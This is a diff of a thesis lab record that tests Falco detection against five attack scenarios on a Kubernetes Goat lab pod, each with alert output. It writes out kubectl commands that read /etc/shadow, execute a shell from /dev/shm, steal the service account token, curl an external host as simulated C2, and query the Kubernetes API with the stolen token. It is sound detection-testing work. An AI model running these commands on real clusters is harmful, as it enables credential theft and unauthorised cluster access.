@@ -1,39 +1,32 @@
 ================================================================
   FALCO ATTACK PoC — Thesis Lab
-  Target: kube-goat (health-check-deployment)
+  Target: Kubernetes Goat (health-check-deployment)
   Namespace: default
+  Pod: health-check-deployment-764f9d7654-v2xzh
+  Container: health-check (container_id=d316001c9c96)
   Image: docker.io/madhuakula/k8s-goat-health-check:latest
 ================================================================
 
-----------------------------------------------------------------
-ATTACK 1 — Fileless Malware (Execution from /dev/shm)
-----------------------------------------------------------------
-MITRE: T1059.004 — Command and Scripting Interpreter
-Falco Rule: "Execution from /dev/shm" (built-in)
-Priority: WARNING
-
-Command:
-  kubectl exec -n default \
-    $(kubectl get pod -n default -l app=health-check \
-    -o jsonpath='{.items[0].metadata.name}') \
-    -- sh -c "cp /bin/sh /dev/shm/evil && /dev/shm/evil -c 'id'"
-
-What it does:
-  Copies a shell binary to /dev/shm (memory-mapped, no disk write)
-  and executes it — classic fileless malware persistence pattern.
-
-Falco Alert:
-  "File execution detected from /dev/shm"
-  process=evil | proc_exepath=/dev/shm/evil | user=root
-  container=health-check | pod=health-check-deployment-*
+Notes:
+  - All five scenarios were run in a single session against the
+    same container. The numbering follows the adversary
+    progression used in the thesis; in the session itself PoC 2
+    was run first, as the alert timestamps show.
+  - "MITRE" is the technique the thesis assigns to the scenario.
+    "Rule tag" is the tag carried by the Falco rule that fired.
+    Where the two differ, the thesis explains why (Chapter 4).
+  - Priorities are exactly what each rule assigned.
+  - Evidence screenshots are in this folder (falco/).
 
 
 ----------------------------------------------------------------
-ATTACK 2 — Sensitive File Access (Credential Harvesting)
+PoC 1 — Sensitive File Access
 ----------------------------------------------------------------
 MITRE: T1003 — OS Credential Dumping
-Falco Rule: "Read sensitive file untrusted" (built-in)
-Priority: WARNING
+Rule tag: T1555 (community rule tag; the thesis follows T1003)
+Falco Rule: "Read sensitive file untrusted" (community)
+Priority: Warning
+Evidence: falco-attack2-sensitive-file-shadow.png
 
 Command:
   kubectl exec -n default \
@@ -42,20 +35,68 @@ Command:
     -- cat /etc/shadow
 
 What it does:
-  Reads /etc/shadow which contains hashed user passwords.
-  Attacker uses this for offline password cracking.
+  Reads /etc/shadow, which holds the password hashes an attacker
+  would take for offline cracking. The read succeeds only because
+  the container runs as root. It is the image's own /etc/shadow,
+  not the node's, so this is a detection baseline rather than a
+  compromise of host credentials.
 
 Falco Alert:
-  "Read sensitive file untrusted"
-  file=/etc/shadow | user=root | container=health-check
+  20:07:31.865517795: Warning Sensitive file opened for reading
+  by non-trusted program
+  file=/etc/shadow | process=cat | proc.exepath=/usr/bin/cat
+  parent=containerd-shim | command=cat /etc/shadow
+  user=root | user.uid=0
+  container_id=d316001c9c96 | container_name=health-check
+  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
+  k8s_pod_name=health-check-deployment-764f9d7654-v2xzh
+  k8s_ns_name=default
 
 
 ----------------------------------------------------------------
-ATTACK 3 — Service Account Token Theft
+PoC 2 — Fileless Execution from /dev/shm
+----------------------------------------------------------------
+MITRE: T1620 — Reflective Code Loading
+Rule tag: T1059.004 (community rule tag; the thesis follows T1620)
+Falco Rule: "Execution from /dev/shm" (community)
+Priority: Warning
+Evidence: falco-attack1-devshm-execution.png
+
+Command:
+  kubectl exec -n default \
+    $(kubectl get pod -n default -l app=health-check \
+    -o jsonpath='{.items[0].metadata.name}') \
+    -- sh -c "cp /bin/sh /dev/shm/evil && /dev/shm/evil -c 'id'"
+
+What it does:
+  Copies a shell binary to /dev/shm (tmpfs, backed by memory) and
+  executes it from there. It returns
+  uid=0(root) gid=0(root) groups=0(root), and no file appears on
+  the container's writable overlay layer.
+
+Falco Alert:
+  20:05:46.763967848: Warning File execution detected from /dev/shm
+  proc.cmdline=sh -c "cp /bin/sh /dev/shm/evil && /dev/shm/evil -c 'id'"
+  process=evil | proc.exepath=/dev/shm/evil
+  parent=sh | command=evil -c id
+  exe_flags=EXE_WRITABLE
+  user=root | user.uid=0
+  container_id=d316001c9c96 | container_name=health-check
+  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
+  k8s_pod_name=health-check-deployment-764f9d7654-v2xzh
+  k8s_ns_name=default
+  tags: T1059.004, mitre_execution
+
+
+----------------------------------------------------------------
+PoC 3 — Service Account Token Theft
 ----------------------------------------------------------------
 MITRE: T1528 — Steal Application Access Token
-Falco Rule: "Read Kubernetes Service Account Token" (CUSTOM)
-Priority: WARNING
+Rule tag: T1528
+Falco Rule: "Read Kubernetes Service Account Token" (CUSTOM,
+            falco/custom-rules.yaml)
+Priority: Warning
+Evidence: falco-attack3-serviceaccount-token.png
 
 Command:
   kubectl exec -n default \
@@ -64,22 +105,32 @@ Command:
     -- sh -c "cat /run/secrets/kubernetes.io/serviceaccount/token"
 
 What it does:
-  Reads the mounted K8s service account JWT token.
-  Attacker can use this token to authenticate to the K8s API
-  and perform lateral movement across the cluster.
+  Reads the Kubernetes service account token (a JWT of about 900
+  characters) that the platform mounts into every pod by default.
+  The token itself is not reproduced here. No community rule
+  matches this action; without the custom rule it would produce
+  no alert at all.
 
 Falco Alert:
-  "Service account token read"
-  process=cat | file=/run/secrets/kubernetes.io/serviceaccount/token
-  pod=health-check-deployment-* | ns=default
+  21:01:35.785496162: Warning Service account token read
+  user=root | process=cat
+  file=/run/secrets/kubernetes.io/serviceaccount/token
+  pod=health-check-deployment-764f9d7654-v2xzh | ns=default
+  container_id=d316001c9c96 | container_name=health-check
+  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
+  tags: T1528, mitre_credential_access
 
 
 ----------------------------------------------------------------
-ATTACK 4 — C2 Communication (curl/wget)
+PoC 4 — Command-and-Control Communication (curl)
 ----------------------------------------------------------------
-MITRE: T1105 — Ingress Tool Transfer / Command and Control
-Falco Rule: "Detect curl or wget inside container" (CUSTOM)
-Priority: WARNING
+MITRE: T1071.001 — Application Layer Protocol: Web Protocols
+Rule tag: T1105 (custom rule tag; the thesis follows T1071.001,
+          because this scenario transfers no tool)
+Falco Rule: "Detect curl or wget inside container" (CUSTOM,
+            falco/custom-rules.yaml)
+Priority: Warning
+Evidence: falco-attack4-curl-c2.png
 
 Command:
   kubectl exec -n default \
@@ -88,61 +139,93 @@ Command:
     -- sh -c "curl -s http://example.com"
 
 What it does:
-  Uses curl inside a container to communicate with external host.
-  Simulates C2 (Command & Control) communication or data exfiltration.
+  Makes an outbound HTTP request with curl, representative of
+  traffic to external command-and-control infrastructure. The
+  request succeeds, so the container can reach arbitrary external
+  hosts. The rule is process-based (proc.name in (curl, wget)):
+  the same request made with another HTTP client or bash's
+  /dev/tcp would not match it.
 
 Falco Alert:
-  "Network tool execution in container"
-  process=curl | command=curl -s http://example.com
-  pod=health-check-deployment-* | ns=default
+  21:02:17.885919289: Warning Network tool execution in container
+  user=root | process=curl | command=curl -s http://example.com
+  pod=health-check-deployment-764f9d7654-v2xzh | ns=default
+  container_id=d316001c9c96 | container_name=health-check
+  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
+  tags: T1105, mitre_command_and_control
 
 
 ----------------------------------------------------------------
-ATTACK 5 — K8s API Lateral Movement via stolen token
+PoC 5 — Kubernetes API Discovery with the stolen token
 ----------------------------------------------------------------
-MITRE: T1552 — Unsecured Credentials / T1528 — Token Theft
-Falco Rules: "Read Kubernetes Service Account Token" + 
-             "Detect curl or wget inside container" (CUSTOM)
-Priority: WARNING
+MITRE: T1613 — Container and Resource Discovery
+Rule tag: not recorded
+Falco Rule: "Contact K8S API Server From Container" (community)
+            The PoC 3 and PoC 4 custom rules also fire, because the
+            command uses cat and curl.
+Priority: Notice
+Evidence: falco-attack5-k8s-api-lateral-movement.png
 
 Command:
   kubectl exec -n default \
     $(kubectl get pod -n default -l app=health-check \
     -o jsonpath='{.items[0].metadata.name}') \
-    -- sh -c "TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
-    && curl -sk -H \"Authorization: Bearer \$TOKEN\" \
-    https://kubernetes.default.svc/api/v1/namespaces/"
+    -- sh -c '
+      TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
+      curl -sk -H "Authorization: Bearer $TOKEN" \
+        https://kubernetes.default.svc/api/v1/namespaces/
+    '
 
 What it does:
-  Full attack chain: steals the service account token (Attack 3)
-  and immediately uses it to query the K8s API for all namespaces.
-  This is lateral movement — attacker escapes the pod context
-  and interacts directly with the cluster control plane.
+  Uses the token from PoC 3 to ask the Kubernetes API what it is
+  allowed to do (list all namespaces). The API server answers,
+  but with an authorisation failure:
 
-Falco Alerts (2 simultaneous):
-  1. "Read Kubernetes Service Account Token"
-     file=/run/secrets/kubernetes.io/serviceaccount/token
-  2. "Detect curl or wget inside container"
-     command=curl -sk -H "Authorization: Bearer ..." 
-     https://kubernetes.default.svc/api/v1/namespaces/
+  {
+    "kind": "Status",
+    "apiVersion": "v1",
+    "status": "Failure",
+    "message": "namespaces is forbidden: User
+      \"system:serviceaccount:default:default\" cannot list
+      resource \"namespaces\" in API group \"\" at the cluster scope",
+    "reason": "Forbidden",
+    "code": 403
+  }
+
+  The contact with the API server is detected, but no resources
+  were enumerated: Kubernetes RBAC, which is outside the four
+  layers evaluated in the thesis, refused the request.
+
+Falco Alert:
+  21:05:58.784373966: Notice Unexpected connection to K8S API
+  Server from container
+  connection=10.244.0.29:34210->10.96.0.1:443
+  proc.exepath=/usr/bin/curl | process=curl | parent=sh
+  user=root | user.uid=0
+  container_id=d316001c9c96 | container_name=health-check
+  container_image=docker.io/madhuakula/k8s-goat-health-check:latest
+  k8s_pod_name=health-check-deployment-764f9d7654-v2xzh
+  k8s_ns_name=default
 
 
 ================================================================
 SUMMARY
 ================================================================
 
-Attack | Rule Type | MITRE     | Severity
--------|-----------|-----------|----------
-1      | Built-in  | T1059.004 | WARNING
-2      | Built-in  | T1003     | WARNING
-3      | Custom    | T1528     | WARNING
-4      | Custom    | T1105     | WARNING
-5      | Custom    | T1528+    | WARNING
-       |           | T1552     |
+PoC | MITRE     | Rule tag  | Rule fired                            | Origin    | Priority
+----|-----------|-----------|---------------------------------------|-----------|---------
+1   | T1003     | T1555     | Read sensitive file untrusted         | Community | Warning
+2   | T1620     | T1059.004 | Execution from /dev/shm               | Community | Warning
+3   | T1528     | T1528     | Read Kubernetes Service Account Token | Custom    | Warning
+4   | T1071.001 | T1105     | Detect curl or wget inside container  | Custom    | Warning
+5   | T1613     | -         | Contact K8S API Server From Container | Community | Notice
 
-All attacks detected by Falco in real-time.
-All alerts forwarded to Falcosidekick → UI dashboard.
-Container context (pod, namespace, image) captured in every alert.
+All five scenarios produced an alert.
+Three were caught by community rules and two needed the custom
+rules written for the thesis (falco/custom-rules.yaml).
+Every alert carried the pod, namespace and container identity.
+PoC 5 was detected, but it was stopped by RBAC (403), not by the
+monitoring stack.
 
 ================================================================
 END OF PoC
